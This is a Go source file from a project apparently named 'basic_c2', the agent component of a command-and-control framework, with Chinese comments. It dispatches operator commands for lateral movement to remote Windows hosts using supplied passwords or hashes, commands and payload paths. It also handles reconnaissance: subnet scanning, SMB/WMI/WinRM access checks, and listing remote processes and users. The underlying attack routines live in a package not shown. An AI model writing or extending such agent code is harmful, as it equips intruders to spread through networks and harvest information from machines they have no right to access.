package commands

import (
	"encoding/json"
	"fmt"

	"basic_c2/agent/lateral"
	"basic_c2/internal/models"
)

// ExecuteLateralMove 执行横向移动命令
func ExecuteLateralMove(reqJSON string) string {
	var req models.LateralMoveRequest
	if err := json.Unmarshal([]byte(reqJSON), &req); err != nil {
		return fmt.Sprintf("Error parsing lateral move request: %v", err)
	}

	// 创建横向移动管理器
	lm := lateral.NewLateralMover()

	// 构建横向移动请求
	moveReq := lateral.MoveRequest{
		Method: lateral.MoveMethod(req.Method),
		Target: lateral.Target{
			IP:       req.TargetIP,
			Hostname: req.TargetHost,
			Port:     req.Port,
		},
		Credentials: lateral.Credentials{
			Username: req.Username,
			Password: req.Password,
			Domain:   req.Domain,
			Hash:     req.Hash,
		},
		Command:     req.Command,
		PayloadPath: req.PayloadPath,
	}

	// 执行横向移动
	result := lm.Move(moveReq)

	// 构建响应
	response := models.LateralMoveResponse{
		ID:      req.ID,
		Success: result.Success,
		Method:  string(result.Method),
		Target:  result.Target,
		Message: result.Message,
		Output:  result.Output,
	}

	// 序列化响应
	respJSON, err := json.Marshal(response)
	if err != nil {
		return fmt.Sprintf("Error serializing response: %v", err)
	}

	return string(respJSON)
}

// ExecuteRecon 执行侦察命令
func ExecuteRecon(reqJSON string) string {
	var req models.ReconRequest
	if err := json.Unmarshal([]byte(reqJSON), &req); err != nil {
		return fmt.Sprintf("Error parsing recon request: %v", err)
	}

	var result string
	var err error
	success := true

	target := lateral.Target{
		IP: req.TargetIP,
	}

	creds := lateral.Credentials{
		Username: req.Username,
		Password: req.Password,
		Domain:   req.Domain,
	}

	switch req.Type {
	case "scan":
		// 扫描网络
		ips, scanErr := lateral.ScanNetwork(req.Subnet)
		if scanErr != nil {
			err = scanErr
			success = false
		} else {
			result = fmt.Sprintf("Found %d hosts: %v", len(ips), ips)
		}

	case "smbcheck":
		// 检查 SMB 访问
		if lateral.CheckSMBAccess(target, creds) {
			result = "SMB access available"
		} else {
			result = "SMB access denied"
			success = false
		}

	case "wmicheck":
		// 检查 WMI 访问
		if lateral.CheckWMIAccess(target, creds) {
			result = "WMI access available"
		} else {
			result = "WMI access denied"
			success = false
		}

	case "winrmcheck":
		// 检查 WinRM 访问
		if lateral.CheckWinRMAccess(target, creds) {
			result = "WinRM access available"
		} else {
			result = "WinRM access denied"
			success = false
		}

	case "sysinfo":
		// 获取系统信息
		result, err = lateral.GetSystemInfo(target, creds)
		if err != nil {
			success = false
		}

	case "processes":
		// 列出进程
		result, err = lateral.ListProcesses(target, creds)
		if err != nil {
			success = false
		}

	case "users":
		// 列出用户
		result, err = lateral.ListUsers(target, creds)
		if err != nil {
			success = false
		}

	default:
		result = fmt.Sprintf("Unknown recon type: %s", req.Type)
		success = false
	}

	// 构建响应
	response := models.ReconResponse{
		ID:      req.ID,
		Success: success,
		Type:    req.Type,
		Data:    result,
	}

	if err != nil {
		response.Data += fmt.Sprintf("\nError: %v", err)
	}

	// 序列化响应
	respJSON, err := json.Marshal(response)
	if err != nil {
		return fmt.Sprintf("Error serializing response: %v", err)
	}

	return string(respJSON)
}
